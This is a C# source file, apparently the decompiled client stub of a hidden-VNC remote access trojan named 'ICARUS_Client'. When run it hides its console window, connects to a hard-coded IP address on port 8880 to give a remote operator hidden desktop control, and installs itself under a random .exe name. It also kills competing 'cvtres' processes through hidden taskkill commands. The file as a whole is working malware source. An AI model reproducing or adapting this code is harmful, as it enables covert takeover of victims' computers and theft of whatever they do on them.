using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Stub;

internal class Program
{
	public const int SW_HIDE = 0;

	private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

	private static readonly Random random = new Random();

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void Main(string[] args)
	{
		Program.ShowWindow(Program.GetConsoleWindow(), 0);
		Random random = new Random();
		string obj = (new string[3] { "0", "1", "2" })[random.Next(0, 3)];
		string ip = "49.185.97.224";
		string text = "True";
		string port = Convert.ToString("8880");
		string id = "ICARUS_Client";
		string mutex = "PvprnxXilsffzcxzpnnehtde";
		string text2 = "False";
		string text3 = "True";
		string path = obj;
		string randomCharacters = Program.getRandomCharacters();
		string wdex = "False";
		string filename = Program.getRandomCharacters() + ".exe";
		if (Process.GetProcessesByName("cvtres").Length == 0)
		{
			if (text.Contains("True"))
			{
				HVNC.StartHVNC(port, ip, id, mutex, "True");
			}
			else
			{
				HVNC.StartHVNC(port, ip, id, mutex, "False");
			}
			if (text3 == "True")
			{
				Installer.Run(path, randomCharacters, filename, wdex);
			}
			if (text2.Contains("True"))
			{
				new RT();
			}
			return;
		}
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName == "cvtres")
			{
				Program.KillHVNC("cvtres");
				process.Kill();
				break;
			}
		}
		if (text.Contains("True"))
		{
			HVNC.StartHVNC(port, ip, id, mutex, "True");
		}
		else
		{
			HVNC.StartHVNC(port, ip, id, mutex, "False");
		}
		if (text3 == "True")
		{
			Installer.Run(path, randomCharacters, filename, wdex);
		}
		if (text2.Contains("True"))
		{
			new RT();
		}
	}

	public static void KillHVNC(string proc)
	{
		List<int> list = new List<int>();
		Process[] processesByName = Process.GetProcessesByName(proc);
		for (int i = 0; i < processesByName.Length; i++)
		{
			list.Add(processesByName[i].Id);
		}
		Program.StartProcess("taskkill /F /IM " + proc + ".exe");
		Program.StartProcess("taskkill /PID " + list.Max() + " /F ");
	}

	public static void StartProcess(string processx)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			UseShellExecute = false,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe",
			Arguments = string.Format("/c " + processx)
		};
		process.StartInfo.RedirectStandardOutput = true;
		process.Start();
	}

	public static string getRandomCharacters()
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= new Random().Next(10, 20); i++)
		{
			stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[Program.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length)]);
		}
		return stringBuilder.ToString();
	}
}
